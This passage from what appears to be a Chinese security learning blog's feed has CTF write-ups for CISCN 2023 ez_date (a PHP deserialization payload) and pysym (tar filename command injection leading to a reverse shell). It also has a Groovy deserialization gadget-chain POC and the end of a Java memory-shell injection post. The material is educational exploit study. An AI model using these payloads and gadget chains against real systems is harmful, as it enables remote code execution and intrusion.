class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);</span><br><span class="line">                <span class="comment">//断开JVM连接</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            System.out.println(vmd.displayName());</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码就是将恶意的字节码进行注入  </p><p><img src="../images/image-20230817173014465.png" alt="image-20230817173014465"></p><p><strong>内存马到这就结束了   学习了挺久的这么多内容  (虽然说是学完了  但是会不会还是另说。。。。。。。。。)</strong></p><p>内存马回显技术在新开一篇文章来写</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1355&quot;&gt;参考文章&lt;/a&gt;     &lt;a href=&quot;https://github.com/Claradoll/Security_Learning&quot;&gt;题目用到的代码地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="java-内存马" scheme="https://ke1nys.github.io/tags/java-%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Nss-Ciscn2023</title>
    <link href="https://ke1nys.github.io/posts/b7182eee.html"/>
    <id>https://ke1nys.github.io/posts/b7182eee.html</id>
    <published>2023-07-19T11:44:28.000Z</published>
    <updated>2023-07-29T08:13:42.297Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h2><p><strong>题目给的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]));</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719200322956.png" alt="image-20230719200322956"></p><p>这里的话不给使用数组进行绕过  经过本地测试</p><p><img src="../images/image-20230719200414990.png" alt="image-20230719200414990"></p><p>可以使用<strong>数字型</strong>和<strong>字符型</strong>进行绕过</p><p><img src="../images/image-20230719201900384.png" alt="image-20230719201900384"></p><p>剩下的关键点就是这个如何绕过这个<code>date</code>函数了</p><p>因为这个正则匹配的话是没过滤字母啥的   所以只要不使用奇奇怪怪的东西就不会被正则到</p><p><img src="../images/image-20230719202055816.png" alt="image-20230719202055816"></p><p><img src="../images/image-20230719202109278.png" alt="image-20230719202109278"></p><p>将字母转义后  就可以输出正常的字母了</p><p>最后的<strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="comment">//注意date函数可以进行转义 把/f\l\a\g转化为/flag</span></span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="comment">//uniqid函数用于生成标识</span></span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="comment">//文件写入操作 把content作为内容写入的uuid中</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="comment">//正则匹配替换 把uuid中的内容进行替换 赋给data</span></span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="comment">//输出data的内容即\flag</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// unserialize(base64_decode($_GET[&#x27;code&#x27;])); </span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; b = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; file = <span class="string">&quot;/f\l\a\g&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>((<span class="variable">$a</span>))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719202258630.png" alt="image-20230719202258630"></p><p><strong>总结</strong></p><ol><li>就是不使用数组  使用数字和字符来绕过<strong>md5</strong>和<strong>sha1</strong>  </li><li>就是使用转义可以避免<code>date</code>函数识别错误</li></ol><h2 id="CISCN-2023-华北-pysym"><a href="#CISCN-2023-华北-pysym" class="headerlink" title="[CISCN 2023 华北]pysym"></a>[CISCN 2023 华北]pysym</h2><p>这里给了个附件  其中关键的核心代码是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br></pre></td></tr></table></figure><p>这里解释了一下上面创建文件新路径的代码</p><p><img src="../images/image-20230719203928179.png" alt="image-20230719203928179"></p><p><img src="../images/image-20230719204806115.png" alt="image-20230719204806115"></p><p>做题多的师傅一下子可能就会想到这里可能存在这个命令的同时执行</p><p>因为这个<code>savepath</code>最后的话是这个<code>filename</code>，所以说我们就可以控制这个<code>savepath</code>了   不能控制这个<code>directory</code> 的原因是因为这个的话上传路径我们不知道  生成的随机数也不可控</p><p><img src="../images/image-20230719205333200.png" alt="image-20230719205333200"></p><p>经过本地测试是能成功执行的  但是换到题目上的时候就没有回显  于是考虑数据外带一下<strong>(弹个shell方便一点)</strong></p><p><strong>考虑到弹shell有些符号是不给使用的  于是就尝试进行base64编码一下</strong></p><p><img src="../images/image-20230719210420750.png" alt="image-20230719210420750"></p><p><strong>这样在自己的服务器上就能收到shell了   由于我这里是公司  弹shell会被墙</strong></p><p>所以就不搞了</p><p><strong>总结</strong></p><ul><li>其实考察点就是<code>python</code>的代码审计和这个命令执行   能否想到的这个问题</li><li>现在的话也是可以想为现在的话是可以  <code>unzip</code>  <code>tar</code>  这些解压命令都可以进行<code>rce</code></li></ul><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN-2023-华北-ez-date&quot;&gt;&lt;a href=&quot;#CISCN-2023-华北-ez-date&quot; class=&quot;headerlink&quot; title=&quot;[CISCN 2023 华北]ez_date&quot;&gt;&lt;/a&gt;[CISCN 2023 华北]ez_date</summary>
      
    
    
    
    
    <category term="Nss-Ciscn2023" scheme="https://ke1nys.github.io/tags/Nss-Ciscn2023/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试</title>
    <link href="https://ke1nys.github.io/posts/8ddb4c74.html"/>
    <id>https://ke1nys.github.io/posts/8ddb4c74.html</id>
    <published>2023-07-18T02:10:28.000Z</published>
    <updated>2023-07-19T11:38:38.090Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="152b8dc2f8b97507f4f94d8930791be027f249f5a5f3fa42334d74987b4b64fb">1a90164da2a38547586d85c848ea23234cf9ef63a8ceedbc151c794cde2931a4d0bfb7ff1045dab3f9bce09aed7c65b72a5cf1365959cc03b50a6d00ba51a256937bd6f838b61ede456b68db5c420595ea39afe5281b0bad21b2aa8e6e36748bedf23d55437eb2e9f41fd3c718a10215395c58674198df302f1469aa52eefd4ce1a3d2b1b82cc88d6e38c704c80465c2f4c15bb000943b7b9ba77782c958b4d6ad502180b504664fca00d6c2ad39e1b1f5ca92802ebdfb8fd885ab5a6f913503</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://ke1nys.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>java-Groovy</title>
    <link href="https://ke1nys.github.io/posts/3776a7e3.html"/>
    <id>https://ke1nys.github.io/posts/3776a7e3.html</id>
    <published>2023-07-17T12:26:52.000Z</published>
    <updated>2023-07-19T11:38:38.074Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>Groovy是Apache 旗下的一种基于JVM的面向对象编程语言，既可以用于面向对象编程，也可以用作纯粹的脚本语言。在语言的设计上它吸纳了Python、Ruby 和 Smalltalk 语言的优秀特性，比如动态类型转换、闭包和元编程支持。 Groovy与 Java可以很好的互相调用并结合编程 ，比如在写 Groovy 的时候忘记了语法可以直接按Java的语法继续写，也可以在 Java 中调用 Groovy 脚本。比起Java，Groovy语法更加的灵活和简洁，可以用更少的代码来实现Java实现的同样功能。</p><h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><p><code>Groovy : 1.7.0-2.4.3</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span>  <span class="operator">=</span> MethodClosure.class.getDeclaredMethod(<span class="string">&quot;doCall&quot;</span>, Object.class);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(mc, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先从这个类开始入手  (<strong>就是最后执行代码的地方</strong>)</p><p><code>org.codehaus.groovy.runtime.MethodClosure</code> 是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用。</p><p>MethodClosure 初始化时接收两个参数，一个是对象，一个是对象的方法名称。</p><p><img src="../images/image-20230718191350775.png" alt="image-20230718191350775"></p><p>​    </p><p>MethodClosure 中有一个 doCall 方法，调用 <code>InvokerHelper.invokeMethod()</code> 方法进行方法调用。</p><p><img src="../images/image-20230718191421942.png" alt="image-20230718191421942"></p><p>这里就是先使用<code>MethodClosure</code>来进行传值  <strong>分别是传一个对象和这个对象的某个方法</strong></p><p>由于这个<code>doCall</code>()是个<code>protected</code>方法   得使用反射调用 </p><p><img src="../images/image-20230718191723300.png" alt="image-20230718191723300"></p><p>这个最后一步的意思就是反射调用这个<code>doCall()</code>方法，然后传值是这个<code>calc</code></p><p><strong>m：就是等会会调用<code>doCall</code>这个方法</strong></p><p><strong><code>invoke(mc,&quot;calc&quot;)</code>  这个里面的<code>mc</code>指的是调用这个<code>MethodClosure</code> 里的<code>doCall</code>方法  <code>calc</code>是这个<code>daCall</code>的参数</strong></p><p><img src="../images/image-20230718192709132.png" alt="image-20230718192709132"></p><h3 id="String-execute-方法"><a href="#String-execute-方法" class="headerlink" title="String.execute() 方法"></a>String.execute() 方法</h3><p>Groovy 为 String 类型添加了 <code>execute()</code> 方法，以便执行 shell 命令，这个方法会返回一个 Process 对象。也就是说，在 Groovy 中，可以直接使用 <code>&quot;ls&quot;.execute()</code> 这种方法来执行系统命令 “ls”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        println(<span class="string">&quot;whoami&quot;</span>.execute().text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里切记生成文件的要选groovy，不然会执行不了</p><p><img src="../images/image-20230718192832925.png" alt="image-20230718192832925"></p><p>其实就是使用<code>Runtime.getRuntime().exec()</code>来执行</p><p><strong>如果在java中可以这样写</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        methodClosure.call();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 分析一波 下个断点</p><p><img src="../images/image-20230718200009817.png" alt="image-20230718200009817"></p><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"><span class="string">&quot;calc&quot;</span>.execute()</span><br><span class="line"><span class="string">&#x27;calc&#x27;</span>.execute()</span><br><span class="line"><span class="string">&quot;$&#123;&quot;</span>calc<span class="string">&quot;.execute()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;$&#123;&#x27;calc&#x27;.execute()&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">&quot;cmd /c dir&quot;</span>.execute().text</span><br><span class="line">println <span class="string">&#x27;whoami&#x27;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;$&#123;&quot;</span>whoami<span class="string">&quot;.execute().text&#125;&quot;</span></span><br><span class="line">println <span class="string">&quot;$&#123;&#x27;whoami&#x27;.execute().text&#125;&quot;</span></span><br><span class="line"><span class="type">def</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">println <span class="string">&quot;$&#123;cmd.execute().text&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h3><p><code>org.codehaus.groovy.runtime.ConvertedClosure</code> 是一个通用适配器，用于将闭包适配到 Java 接口。ConvertedClosure 实现了 ConversionHandler 类，而 ConversionHandler 又实现了 InvocationHandler。所以说 ConvertedClosure 本身就是一个动态代理类。</p><p>ConvertedClosure 的构造方法接收一个 Closure 对象和一个 String 类型的 method 方法名，也就是说 ConvertedClosure 会代理这个 Closure 对象，当调用其 method 方法时，将会调用 ConvertedClosure 父类的 <code>invoke</code> 方法，除了 toString 和一些默认方法外，会调用 <code>invokeCustom</code> 方法。</p><p>如果初始化时指定的 method 与 <code>invokeCustom</code> 指定的 method 参数相同，则 <code>invokeCustom</code> 方法将会调用代理对象 Closure 的 call 方法执行传入参数执行。</p><p><img src="../images/image-20230718194334220.png" alt="image-20230718194334220"></p><p>看到这里就明白这条链的触发逻辑了。后面自然是使用 <code>AnnotationInvocationHandler</code> 将 <code>ConvertedClosure</code> 代理成 <code>Map</code> 类。这样在反序列化</p><h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><p><strong>最终的POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Groovy.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//封装我们需要执行的对象</span></span><br><span class="line"><span class="type">MethodClosure</span>    <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;open -a Calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line"><span class="type">ConvertedClosure</span> <span class="variable">closure</span>       <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt;       c           = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 ConvertedClosure 的动态代理类实例</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">handler</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, closure);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用动态代理初始化 AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, handler);</span><br><span class="line"></span><br><span class="line">SerializeUtil.writeObjectToFile(invocationHandler, fileName);</span><br><span class="line">SerializeUtil.readFileObject(fileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用链展示</strong></p><figure class="highlight java"><table><tr><td 